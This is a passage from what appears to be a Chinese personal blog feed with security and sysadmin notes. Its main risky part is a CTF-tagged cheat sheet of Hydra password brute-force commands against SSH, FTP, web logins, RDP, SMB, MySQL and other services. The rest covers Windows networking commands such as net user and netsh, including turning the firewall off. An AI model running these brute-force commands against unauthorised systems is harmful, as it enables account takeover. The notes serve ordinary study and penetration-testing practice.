list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/50.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;mysql基础运维&quot;&gt;&lt;a href=&quot;#mysql基础运维&quot; class=&quot;headerlink&quot; title=&quot;mysql基础运维&quot;&gt;&lt;/a&gt;mysql基础运维&lt;/h2&gt;&lt;h3 id=&quot;查看数据库服务是否处于active状态&quot;&gt;&lt;a href=&quot;#查看数据库服</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Hydra常用爆破语句</title>
    <link href="https://jielunya.github.io/2022/12/02/Hydra%E5%B8%B8%E7%94%A8%E7%88%86%E7%A0%B4%E8%AF%AD%E5%8F%A5/"/>
    <id>https://jielunya.github.io/2022/12/02/Hydra%E5%B8%B8%E7%94%A8%E7%88%86%E7%A0%B4%E8%AF%AD%E5%8F%A5/</id>
    <published>2022-12-02T04:46:28.616Z</published>
    <updated>2022-12-02T05:00:53.842Z</updated>
    
    <content type="html"><![CDATA[<h2 id="破解ssh："><a href="#破解ssh：" class="headerlink" title="破解ssh："></a>破解ssh：</h2><p>hydra -l 用户名 -P 密码字典 -t 线程 -vV -e ns ip ssh<br>hydra -l 用户名 -P 密码字典 -t 线程 -o save.log -vV ip ssh </p><h2 id="破解ftp："><a href="#破解ftp：" class="headerlink" title="破解ftp："></a>破解ftp：</h2><p>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV </p><h2 id="get方式提交，破解web登录："><a href="#get方式提交，破解web登录：" class="headerlink" title="get方式提交，破解web登录："></a>get方式提交，破解web登录：</h2><p>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get &#x2F;admin&#x2F;<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get &#x2F;admin&#x2F;index.php</p><h2 id="post方式提交，破解web登录："><a href="#post方式提交，破解web登录：" class="headerlink" title="post方式提交，破解web登录："></a>post方式提交，破解web登录：</h2><p>hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “&#x2F;admin&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;submit&#x3D;login:sorry password”<br>hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id&#x3D;^USER^&amp;passwd&#x3D;^PASS^:<title>wrong username or password</title>“<br>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。） </p><h2 id="破解https："><a href="#破解https：" class="headerlink" title="破解https："></a>破解https：</h2><p>hydra -m &#x2F;index.php -l muts -P pass.txt 10.36.16.18 https </p><h2 id="破解teamspeak："><a href="#破解teamspeak：" class="headerlink" title="破解teamspeak："></a>破解teamspeak：</h2><p>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak </p><h2 id="破解cisco："><a href="#破解cisco：" class="headerlink" title="破解cisco："></a>破解cisco：</h2><p>hydra -P pass.txt 10.36.16.18 cisco<br>hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable </p><h2 id="破解smb："><a href="#破解smb：" class="headerlink" title="破解smb："></a>破解smb：</h2><p>hydra -l administrator -P pass.txt 10.36.16.18 smb </p><h2 id="破解pop3："><a href="#破解pop3：" class="headerlink" title="破解pop3："></a>破解pop3：</h2><p>hydra -l muts -P pass.txt my.pop3.mail pop3 </p><h2 id="破解rdp："><a href="#破解rdp：" class="headerlink" title="破解rdp："></a>破解rdp：</h2><p>hydra ip rdp -l administrator -P pass.txt -V </p><h2 id="破解http-proxy："><a href="#破解http-proxy：" class="headerlink" title="破解http-proxy："></a>破解http-proxy：</h2><p>hydra -l admin -P pass.txt http-proxy:&#x2F;&#x2F;10.36.16.18 </p><h2 id="破解imap："><a href="#破解imap：" class="headerlink" title="破解imap："></a>破解imap：</h2><p>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN<br>hydra -C defaults.txt -6 imap:&#x2F;&#x2F;[fe80::2c:31ff:fe12:ac11]:143&#x2F;PLAIN</p><h2 id="爆破mysql："><a href="#爆破mysql：" class="headerlink" title="爆破mysql："></a>爆破mysql：</h2><p>hydra -L .&#x2F;user.txt -P .&#x2F;password.txt -t 2 -e n -f -v 192.168.43.17 mysql<br>mysql远程连接：mysql -h ip -u root -p</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;破解ssh：&quot;&gt;&lt;a href=&quot;#破解ssh：&quot; class=&quot;headerlink&quot; title=&quot;破解ssh：&quot;&gt;&lt;/a&gt;破解ssh：&lt;/h2&gt;&lt;p&gt;hydra -l 用户名 -P 密码字典 -t 线程 -vV -e ns ip ssh&lt;br&gt;hydra -</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Windows网络命令</title>
    <link href="https://jielunya.github.io/2022/12/02/Windows%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/"/>
    <id>https://jielunya.github.io/2022/12/02/Windows%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/</id>
    <published>2022-12-02T04:29:48.675Z</published>
    <updated>2022-12-02T05:00:52.619Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows网络命令"><a href="#Windows网络命令" class="headerlink" title="Windows网络命令"></a>Windows网络命令</h2><p>开始——运行——CMD——提示符后面输入命令。上下箭头键的使用，上下箭头键，调出已经输入的命令。<br>  1.Windows常用网络命令</p><h3 id="ipconfig命令：IP配置查看命令"><a href="#ipconfig命令：IP配置查看命令" class="headerlink" title="ipconfig命令：IP配置查看命令"></a>ipconfig命令：IP配置查看命令</h3><p>显示IP协议（IP地址、子网掩码、网关）的配置信息<br>  ipconfig&#x2F;?<br>  ipconfig&#x2F;all&#x2F;&#x2F;显示详细的配置信息（物理地址）<br>DHCP，自动获取IP地址：<br>  ipconfig&#x2F;release&#x2F;&#x2F;释放IP地址<br>  ipconfig&#x2F;renew&#x2F;&#x2F;重新获取IP地址<br>  ipconfig&#x2F;flushdns&#x2F;&#x2F;清除DNS解析缓存</p><h3 id="ping命令：测试目的地址是否连通"><a href="#ping命令：测试目的地址是否连通" class="headerlink" title="ping命令：测试目的地址是否连通"></a>ping命令：测试目的地址是否连通</h3><p>格式：ping 参数 IP地址或名称<br>参数：<br>  -l 设置数据包大小 32—65500，默认32字节<br>  -n 自定义数据包个数，默认4<br>  -t 一直ping直到人为中断（CTRL+C）<br>  -a 显示计算机名<br>网络诊断步骤：<br>① ping 127.0.0.1（环回地址）<br>  ping不通，TCP&#x2F;IP协议存在问题。<br>② ping 本机IP地址<br>  ping不通，本地配置（连接）或网卡安装存在问题。<br>③ ping 本网内其它IP地址<br>  ping不通，本地网卡和线路存在问题。<br>④ ping 网关IP地址<br>  ping不通，网关存在问题。<br>⑤ ping 公网地址（61.177.238.201）<br>  ping不通，不能连入公网。<br>⑥ ping 域名（<a href="http://www.baidu.com)/">www.baidu.com）</a><br>  ping不通，DNS配置存在问题。</p><h3 id="netstat命令：查看相关协议统计信息和网络连接情况"><a href="#netstat命令：查看相关协议统计信息和网络连接情况" class="headerlink" title="netstat命令：查看相关协议统计信息和网络连接情况"></a>netstat命令：查看相关协议统计信息和网络连接情况</h3><p>（检测网络连接）<br>  netstat -s -e&#x2F;&#x2F;查看相关协议统计信息<br>  netstat -a -n&#x2F;&#x2F;查看网络连接情况</p><h3 id="tracert命令：查看数据包达到目标主机所经过的路径"><a href="#tracert命令：查看数据包达到目标主机所经过的路径" class="headerlink" title="tracert命令：查看数据包达到目标主机所经过的路径"></a>tracert命令：查看数据包达到目标主机所经过的路径</h3><h3 id="arp-命令：查看修改地址解析协议（ip地址——MAC地址）"><a href="#arp-命令：查看修改地址解析协议（ip地址——MAC地址）" class="headerlink" title="arp 命令：查看修改地址解析协议（ip地址——MAC地址）"></a>arp 命令：查看修改地址解析协议（ip地址——MAC地址）</h3><p>  -a 查看<br>  -s 静态绑定ip地址和MAC地址<br>  -d 删除</p><h3 id="nslookup命令"><a href="#nslookup命令" class="headerlink" title="nslookup命令"></a>nslookup命令</h3><p>nslookup命令：DNS域名解析工具</p><h3 id="nbtstat命令"><a href="#nbtstat命令" class="headerlink" title="nbtstat命令"></a>nbtstat命令</h3><p>nbtstat命令：使用TCP&#x2F;IP上的NetBIOS显示协议统计和当前TCP&#x2F;IP连接，可以得到远程主机的NETBIOS信息，如用户名、所属工作组，网卡的MAC地址等<br>参数：<br>  -a 通过远程主机的机器名得到NETBIOS信息<br>  -A 通过远程主机的IP地址得到NETBIOS信息<br>  -n 列出本地主机的NETBIOS信息</p><h2 id="Windows中net命令集"><a href="#Windows中net命令集" class="headerlink" title="Windows中net命令集"></a>Windows中net命令集</h2><p>   net help 子命令<br>   net 子命令 &#x2F;?</p><h3 id="Net-User-本地用户帐号操作"><a href="#Net-User-本地用户帐号操作" class="headerlink" title="Net User  本地用户帐号操作"></a>Net User  本地用户帐号操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：Net user [username [password | *] [options]] [/domain]</span><br></pre></td></tr></table></figure><p>  net user&#x2F;&#x2F;查看所有用户<br>  net user zhangsan bg888 &#x2F;add&#x2F;&#x2F;添加用户zhangsan密码bg888，默认users用户组<br>  net user zhangsan&#x2F;&#x2F;查看用户zhangsan的具体信息<br>  net user zhangsan &#x2F;active:no&#x2F;&#x2F;禁用用户帐户<br>  net user zhangsan &#x2F;active:yes&#x2F;&#x2F;启用用户帐户<br>  net user zhangsan &#x2F;delete&#x2F;&#x2F;删除用户zhang3</p><h3 id="Net-Localgroup-本地用户组操作"><a href="#Net-Localgroup-本地用户组操作" class="headerlink" title="Net Localgroup  本地用户组操作"></a>Net Localgroup  本地用户组操作</h3><p>格式：Net localgroup groupname {&#x2F;add [&#x2F;comment:”text “] | &#x2F;delete} [&#x2F;domain]<br>  net localgroup              &#x2F;&#x2F;查看所有组<br>  net localgroup administrators   &#x2F;&#x2F;查看组administrators的具体信息<br>  net localgroup teacher &#x2F;add   &#x2F;&#x2F;添加组teacher<br>  net localgroup home1 &#x2F;delete    &#x2F;&#x2F;删除组home1<br>  net localgroup teacher zhangsan &#x2F;add  &#x2F;&#x2F;将用户zhangsan加入到组teacher</p><h3 id="Net-Share-共享资源操作"><a href="#Net-Share-共享资源操作" class="headerlink" title="Net Share  共享资源操作"></a>Net Share  共享资源操作</h3><p>格式：Net share sharename&#x3D;drive:path [&#x2F;users:number | &#x2F;unlimited] [&#x2F;remark:”text”]<br>·sharename是共享资源的网络名称<br>·drive:path指定共享目录的绝对路径<br>·&#x2F;users:number设置可同时访问共享资源的最大用户数<br>·&#x2F;unlimited不限制同时访问共享资源的用户数<br>·&#x2F;remark:”text “添加关于资源的注释，注释文字用引号引住<br>  net share           &#x2F;&#x2F;显示计算机上所有共享资源<br>  net share myshare&#x3D;c:\fhsh01 &#x2F;&#x2F;共享名myshare，共享路径c:\fhsh01<br>  net share mysh02&#x3D;c:\fhsh02 &#x2F;users:10<br>  net share yesky&#x3D;c:\temp &#x2F;remark:”my first share”<br>  &#x2F;&#x2F;以yesky为共享名共享C:\temp<br>　net share mysh02 &#x2F;delete   &#x2F;&#x2F;停止共享mysh02</p><h3 id="Net-View-显示计算机列表或指定计算机的共享资源"><a href="#Net-View-显示计算机列表或指定计算机的共享资源" class="headerlink" title="Net View  显示计算机列表或指定计算机的共享资源"></a>Net View  显示计算机列表或指定计算机的共享资源</h3><p>格式：Net view [\computername | &#x2F;domain[:domainname]]<br>·\computername指定要查看其共享资源的计算机<br>·&#x2F;domain[:domainname]指定要查看其可用计算机的域<br>  net view            &#x2F;&#x2F;显示当前域的计算机列表<br>  net view &#x2F;domain:XYZ    &#x2F;&#x2F;显示XYZ域中的计算机列表<br>　net view \GHQ       &#x2F;&#x2F;查看GHQ计算机的共享资源<br>　net view \192.168.8.201</p><h3 id="Net-Use-连接计算机共享资源，或显示连接信息"><a href="#Net-Use-连接计算机共享资源，或显示连接信息" class="headerlink" title="Net Use  连接计算机共享资源，或显示连接信息"></a>Net Use  连接计算机共享资源，或显示连接信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：Net use [devicename | *] [\\computername\sharename[\volume]] [password|*]][/user:[domainname\]username][[/delete]| [/persistent:&#123;yes | no&#125;]]</span><br></pre></td></tr></table></figure><p>·键入不带参数的Net use列出网络连接<br>·devicename指定要连接到的资源名称或要断开的设备名称<br>·\computername\sharename服务器及共享资源的名称<br>·password访问共享资源的密码<br>·*提示键入密码<br>·&#x2F;user指定进行连接的另外一个用户<br>·domainname指定另一个域<br>·username指定登录的用户名<br>·&#x2F;home将用户连接到其宿主目录<br>·&#x2F;delete取消指定网络连接<br>·&#x2F;persistent控制永久网络连接的使用<br>  net use f: \gho\temp &#x2F;&#x2F;将\gho\temp共享目录映射为F盘<br>  net use g: \192.168.8.201\myshare<br>  net use f: &#x2F;delete    &#x2F;&#x2F;断开连接</p><h3 id="Net-Time-使计算机时钟与另一台计算机或域的时间同步"><a href="#Net-Time-使计算机时钟与另一台计算机或域的时间同步" class="headerlink" title="Net Time  使计算机时钟与另一台计算机或域的时间同步"></a>Net Time  使计算机时钟与另一台计算机或域的时间同步</h3><p>格式：Net time [\computername | &#x2F;domain[:name]] [&#x2F;set]<br>·\computername要检查或同步的服务器名<br>·&#x2F;domain[:name]指定要与其时间同步的域<br>·&#x2F;set使本计算机时钟与指定计算机或域的时钟同步</p><h3 id="Net-Start-Stop-Pause-Continue-启动-停止-暂停-重新激活服务，或显示已启动服务的列表"><a href="#Net-Start-Stop-Pause-Continue-启动-停止-暂停-重新激活服务，或显示已启动服务的列表" class="headerlink" title="Net Start|Stop|Pause|Continue  启动|停止|暂停|重新激活服务，或显示已启动服务的列表"></a>Net Start|Stop|Pause|Continue  启动|停止|暂停|重新激活服务，或显示已启动服务的列表</h3><p>格式：net Start|Stop|Pause|Continue service<br>&lt;1&gt;alerter(警报)<br>&lt;2&gt;client service for netware(Netware 客户端服务)<br>&lt;3&gt;clipbook server(剪贴簿服务器)<br>&lt;4&gt;computer browser(计算机浏览器)<br>&lt;5&gt;directory replicator(目录复制器)<br>&lt;6&gt;ftp publishing service (ftp )(ftp 发行服务)<br>&lt;7&gt;lpdsvc<br>&lt;8&gt;net logon(网络登录)<br>&lt;9&gt;network dde(网络 dde)<br>&lt;10&gt;network dde dsdm(网络 dde dsdm)<br>&lt;11&gt;network monitor agent(网络监控代理)<br>&lt;12&gt;nt lm security support provider(NT LM 安全性支持提供)<br>&lt;13&gt;ole(对象链接与嵌入)<br>&lt;14&gt;remote access connection manager(远程访问连接管理器)<br>&lt;15&gt;remote access isnsap service(远程访问 isnsap 服务)<br>&lt;16&gt;remote access server(远程访问服务器)<br>&lt;17&gt;remote procedure call (rpc) locator(远程过程调用定位器)<br>&lt;18&gt;remote procedure call (rpc) service(远程过程调用服务)<br>&lt;19&gt;schedule(调度)<br>&lt;20&gt;server(服务器)<br>&lt;21&gt;simple tcp&#x2F;ip services(简单 TCP&#x2F;IP 服务)<br>&lt;22&gt;snmp<br>&lt;23&gt;spooler(后台打印程序)<br>&lt;24&gt;tcp&#x2F;ip netbios helper(TCP&#x2F;IP NETBIOS 辅助工具)<br>&lt;25&gt;ups (26)workstation(工作站)<br>&lt;27&gt;messenger(信使)<br>&lt;28&gt;dhcp client</p><h3 id="Net-Statistics-显示本地工作站或服务器服务统计记录"><a href="#Net-Statistics-显示本地工作站或服务器服务统计记录" class="headerlink" title="Net Statistics  显示本地工作站或服务器服务统计记录"></a>Net Statistics  显示本地工作站或服务器服务统计记录</h3><p>格式：Net statistics [workstation | server]<br>·键入不带参数的Net statistics列出其统计信息可用的运行服务<br>·workstation显示本地工作站服务的统计信息<br>·server显示本地服务器服务的统计信息<br>  net statistics server | more    &#x2F;&#x2F;显示服务器服务统计信息</p><h3 id="Net-Session-列出或断开本地计算机和连接客户端的会话"><a href="#Net-Session-列出或断开本地计算机和连接客户端的会话" class="headerlink" title="Net Session  列出或断开本地计算机和连接客户端的会话"></a>Net Session  列出或断开本地计算机和连接客户端的会话</h3><p>格式：Net session [\computername] [&#x2F;delete]<br>·键入不带参数的Net session显示所有与本地计算机的会话的信息<br>·\computername标识要列出或断开会话的计算机<br>·&#x2F;delete结束与\computername计算机会话并关闭本次会话期间计算机的所有打开文件；如果省略\computername 参数，将取消与本地计算机的所有会话<br>  net session \GHQ     &#x2F;&#x2F;显示计算机名为GHQ的客户端会话信息列表</p><h3 id="Net-Send-向网络的其他用户、计算机或通信名发送消息"><a href="#Net-Send-向网络的其他用户、计算机或通信名发送消息" class="headerlink" title="Net Send  向网络的其他用户、计算机或通信名发送消息"></a>Net Send  向网络的其他用户、计算机或通信名发送消息</h3><p>格式：Net send {name | * | &#x2F;domain[:name] | &#x2F;users} message<br>·name要接收发送消息的用户名、计算机名或通信名<br>·* 将消息发送到组中所有名称<br>·&#x2F;domain[:name]将消息发送到计算机域中的所有名称<br>·&#x2F;users将消息发送到与服务器连接的所有用户<br>·message作为消息发送的文本<br>  net send &#x2F;users server will shutdown in 10 minutes<br>  &#x2F;&#x2F;给所有连接到服务器的用户发送消息</p><h3 id="Net-Config-显示当前运行的可配置服务，或显示并更改某项服务的设置"><a href="#Net-Config-显示当前运行的可配置服务，或显示并更改某项服务的设置" class="headerlink" title="Net Config  显示当前运行的可配置服务，或显示并更改某项服务的设置"></a>Net Config  显示当前运行的可配置服务，或显示并更改某项服务的设置</h3><p>格式：Net config [service [options]]<br>·键入不带参数的Net config显示可配置服务的列表<br>·service通过Net config命令进行配置的服务(server或workstation)<br>·options服务的特定选项</p><h2 id="Windows在命令行里设置ip地址"><a href="#Windows在命令行里设置ip地址" class="headerlink" title="Windows在命令行里设置ip地址"></a>Windows在命令行里设置ip地址</h2><p>netsh interface ip set address “本地连接” static 地址 子网掩码 网关<br>netsh interface ip set address “本地连接” dhcp<br>netsh interface ip set address “以太网” static 地址 子网掩码 网关</p><h2 id="netsh-Network-Shell"><a href="#netsh-Network-Shell" class="headerlink" title="netsh (Network Shell)"></a>netsh (Network Shell)</h2><p>netsh (Network Shell)是一个 windows 系统本身提供的功能强大的网络配置命令行工具。<br>导出配置脚本：netsh -c interface ip dump &gt; c:\interface.txt<br>导入配置脚本：netsh -f c:\interface.txt。<br>netsh interface ip show address - 显示 IP 地址<br>netsh interface ip show config - 显示更多详情<br>netsh interface ip show ipaddress - 显示 IP 地址类型<br>netsh interface ip show ipnet - 显示网络到媒体项目<br>netsh interface ip show route - 显示当前路由信息<br>netsh interface ip show interface - 显示接口信息<br>netsh interface ip set address “以太网” dhcp - 通过 DHCP 设置 IP 地址<br>netsh interface ip set address “以太网” static 10.1.2.10 255.255.255.0 10.1.2.254 - 设置以太网 IP 地址<br>netsh interface ip show dns - 显示 DNS 地址<br>netsh interface ip set dns “以太网” dhcp - 通过 DHCP 设置 DNS 地址<br>netsh interface ip set dns “以太网” static 10.0.12.8 - 设置以太网 DNS 地址，清除原有 DNS 设置<br>netsh interface ip add dns “以太网” 114.114.114.114 index&#x3D;2 - 添加以太网 DNS 地址，index 为自定义排序<br>netsh interface ip add dns “以太网” 8.8.8.8 index&#x3D;3 - 添加以太网 DNS 地址，index 为自定义排序<br>netsh interface ip add dns “以太网” 1.1.1.1 index&#x3D;4 - 添加以太网 DNS 地址，index 为自定义排序<br>netsh interface ip add dns “以太网” 223.5.5.5 index&#x3D;5 - 添加以太网 DNS 地址，index 为自定义排序<br>netsh -c interface dump &gt; d:\1.txt 导出配置到 D 盘并命名为 1.txt<br>netsh -f d:\2.txt 导入在 D 盘命名为 2.txt 的配置文件<br>C:\Users\Administrator&gt;netsh<br>abort – 丢弃在脱机模式下所做的更改。<br>add – 在项目列表上添加一个配置项目。<br>advfirewall – 更改到 <code>netsh advfirewall’ 上下文。 alias – 添加一个别名 branchcache – 更改到 </code>netsh branchcache’ 上下文。<br>bridge – 更改到 <code>netsh bridge’ 上下文。 bye – 退出程序。 commit – 提交在脱机模式中所做的更改。 delete – 在项目列表上删除一个配置项目。 dhcpclient – 更改到 </code>netsh dhcpclient’ 上下文。<br>dnsclient – 更改到 <code>netsh dnsclient’ 上下文。 dump – 显示一个配置脚本。 exec – 运行一个脚本文件。 exit – 退出程序。 firewall – 更改到 </code>netsh firewall’ 上下文。<br>help – 显示命令列表。<br>http – 更改到 <code>netsh http’ 上下文。 interface – 更改到 </code>netsh interface’ 上下文。<br>ipsec – 更改到 <code>netsh ipsec’ 上下文。 lan – 更改到 </code>netsh lan’ 上下文。<br>mbn – 更改到 <code>netsh mbn’ 上下文。 namespace – 更改到 </code>netsh namespace’ 上下文。<br>netio – 更改到 <code>netsh netio’ 上下文。 offline – 将当前模式设置成脱机。 online – 将当前模式设置成联机。 p2p – 更改到 </code>netsh p2p’ 上下文。<br>popd – 从堆栈上打开一个上下文。<br>pushd – 将当前上下文放入堆栈。<br>quit – 退出程序。<br>ras – 更改到 <code>netsh ras’ 上下文。 rpc – 更改到 </code>netsh rpc’ 上下文。<br>set – 更新配置设置。<br>show – 显示信息。<br>trace – 更改到 <code>netsh trace’ 上下文。 unalias – 删除一个别名。 wcn – 更改到 </code>netsh wcn’ 上下文。<br>wfp – 更改到 <code>netsh wfp’ 上下文。 winhttp – 更改到 </code>netsh winhttp’ 上下文。<br>winsock – 更改到 <code>netsh winsock’ 上下文。 wlan – 更改到 </code>netsh wlan’ 上下文。</p><blockquote><p>netsh winsock<br>audit – 显示已经安装和删除的 Winsock LSP 列表。<br>dump – 显示一个配置脚本。<br>help – 显示命令列表。<br>remove – 从系统中删除 Winsock LSP。<br>reset – 重置 Winsock 目录为清除状态。<br>set – 设置 Winsock 选项。<br>show – 显示信息。<br>netsh interface<br>6to4 – 更改到 <code>netsh interface 6to4′ 上下文。 ? – 显示命令列表。 dump – 显示一个配置脚本。 help – 显示命令列表。 httpstunnel – 更改到 </code>netsh interface httpstunnel’ 上下文。<br>ipv4 – 更改到 <code>netsh interface ipv4′ 上下文。 ipv6 – 更改到 </code>netsh interface ipv6′ 上下文。<br>isatap – 更改到 <code>netsh interface isatap’ 上下文。 portproxy – 更改到 </code>netsh interface portproxy’ 上下文。<br>set – 设置配置信息。<br>show – 显示信息。<br>tcp – 更改到 <code>netsh interface tcp’ 上下文。 teredo – 更改到 </code>netsh interface teredo’ 上下文。<br>netsh interface ipv4<br>add – 在一个表格中添加一个配置项。<br>delete – 从一个表格中删除一个配置项。<br>dump – 显示一个配置脚本。<br>help – 显示命令列表。<br>install – 安装 IP 协议。<br>reset – 重置 IP 配置。<br>set – 设置配置信息。<br>show – 显示信息。<br>uninstall – 卸载 IP 协议。<br>netsh interface ipv4 set<br>set address – 设定通向接口的 IP 地址或默认网关。<br>set compartment – 修改分段配置参数。<br>set dnsservers – 设置 DNS 服务器模式和地址。<br>set dynamicportrange – 修更改态端口分配所使用端口的范围。<br>set global – 修改全局配置常规参数。<br>set interface – 修改 IP 的接口配置参数。<br>set neighbors – 设置邻居地址。<br>set route – 修改路由参数。<br>set subinterface – 修改子接口配置参数。<br>set winsservers – 设置 WINS 服务器模式和地址。<br>netsh interface ipv4 show<br>show addresses – 显示 IP 地址配置。<br>show compartments – 显示分段参数。<br>show config – 显示 IP 地址和其他信息。<br>show destinationcache – 显示目标缓存项目。<br>show dnsservers – 显示 DNS 服务器地址。<br>show dynamicportrange – 显示动态端口范围配置参数。<br>show excludedportrange – 显示所有排除的端口范围。<br>show global – 显示全局配置普通参数。<br>show icmpstats – 显示 ICMP 统计。<br>show interfaces – 显示接口参数。<br>show ipaddresses – 显示当前 IP 地址。<br>show ipnettomedia – 显示 IP 的网络到媒体的映射。<br>show ipstats – 显示 IP 统计。<br>show joins – 显示加入的多播组。<br>show neighbors – 显示邻居缓存项。<br>show offload – 显示卸载信息。<br>show route – 显示路由表项目。<br>show subinterfaces – 显示子接口参数。<br>show tcpconnections – 显示 TCP 连接。<br>show tcpstats – 显示 TCP 统计。<br>show udpconnections – 显示 UDP 连接。<br>show udpstats – 显示 UDP 统计。<br>show winsservers – 显示 WINS 服务器地址。<br>netsh interface ipv4 add<br>add address – 将静态 IP 地址或默认网关添加到指定接口。<br>add dnsservers – 添加一个静态 DNS 服务器地址。<br>add excludedportrange – 为连续的端口块添加排除。<br>add neighbors – 添加邻居地址。<br>add route – 在接口上添加路由。<br>add winsservers – 添加一个静态 WINS 服务器地址。</p></blockquote><h2 id="Netsh命令详解"><a href="#Netsh命令详解" class="headerlink" title="Netsh命令详解"></a>Netsh命令详解</h2><p>Netsh是一个功能非常强大的系统内置命令。如果能了解一点常规操作的话，对管理员来说有时会有意想不到的帮助。比如我的客户的系统都是做过一些策略的。好多操作还必须在命令行下完成。下面简单介绍几个常用功能。其它的可以参考netsh的帮助文件。<br>　　netsh int ip set add “本地连接” static 192.168.1.188 255.255.255.0<br>　　Netsh是一个功能非常强大的系统内置命令。如果能了解一点常规操作的话，对管理员来说有时会有意想不到的帮助。比如我的客户的系统都是做过一些策略的。好多操作还必须在命令行下完成。下面简单介绍几个常用功能。其它的可以参考netsh的帮助文件。<br>　　a) 启用防火墙<br>　　C:&gt;netsh firewall set opmode mode &#x3D; enable<br>　　确定。<br>　　b) 关闭防火墙<br>　　C:&gt;netsh firewall set opmode mode &#x3D; disable<br>　　确定。<br>　　c) 重置防火墙<br>　　C:&gt;netsh firewall reset<br>　　确定。<br>　　1、查看网络配置<br>　　netsh interface ip show {选项}<br>　　{选项}可以是：<br>　　address   - 显示 IP 地址配置。<br>　　config    - 显示 IP 地址和更多信息。<br>　　dns       - 显示 DNS 服务器地址。<br>　　icmp      - 显示 ICMP 统计。<br>　　interface - 显示 IP 接口统计。<br>　　ipaddress - 显示当前 IP 地址<br>　　ipnet     - 显示 IP 的网络到媒体的映射。<br>　　ipstats   - 显示 IP 统计。<br>　　joins     - 显示加入的多播组。<br>　　offload   - 显示卸载信息。<br>　　tcpconn   - 显示 TCP 连接。<br>　　tcpstats - 显示 TCP 统计。<br>　　udpconn   - 显示 UDP 连接。<br>　　udpstats - 显示 UDP 统计。<br>　　wins      - 显示 WINS 服务器地址。<br>　　2、配置接口IP&#x2F;网关IP<br>　　netsh interface ip set address “本地连接” static 192.168.1.100 255.255.255.0 192.168.1.253<br>　　——————————<br>　　Microsoft Windows XP [版本 5.1.2600]<br>　　(C) 版权所有 1985-2001 Microsoft Corp.<br>　　C:&gt;netsh interface ip show config<br>　　接口 “本地连接” 的配置<br>　　DHCP 启用                        否<br>　　IP 地址                             192.168.1.100<br>　　子网掩码                            255.255.255.0<br>　　默认网关:                     192.168.1.253<br>　　GatewayMetric:                0<br>　　InterfaceMetric                     0<br>　　静态配置的 DNS 服务器:    202.96.209.134<br>　　静态配置的 WINS 服务器:   无<br>　　用哪个前缀注册:           只是主要<br>　　3、配置自动换取IP地址,DNS地址及wins地址<br>　　netsh interface ip set address “本地连接” dhcp<br>　　netsh interface ip set dns “本地连接” dhcp<br>　　netsh interface ip set wins “本地连接” dhcp<br>　　4、配置静态IP地址，DNS地址及wins地址<br>　　netsh interface ip set address “本地连接” static 192.168.1.253<br>　　netsh interface ip set dns “本地连接” static 202.96.209.6<br>　　netsh interface ip set wins “本地连接” static 192.168.1.1<br>　　5、查看并导出网络配置文件<br>　　C:&gt;netsh -c interface dump &gt;c:\dump.txt 　（”&gt;”表示导出。”&gt;&gt;”表示追加）<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　# 接口配置<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　pushd interface<br>　　reset all<br>　　popd<br>　　# 接口配置结束<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　# 接口配置<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　pushd interface ipv6<br>　　uninstall<br>　　popd<br>　　# 接口配置结束<br>　　# ———————————-<br>　　# ISATAP 配置<br>　　# ———————————-<br>　　pushd interface ipv6 isatap<br>　　popd<br>　　# ISATAP 配置结束<br>　　# ———————————-<br>　　# 6to4 配置<br>　　# ———————————-<br>　　pushd interface ipv6 6to4<br>　　reset<br>　　popd<br>　　# 6to4 配置结束<br>　　#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>　　# 端口代理配置<br>　　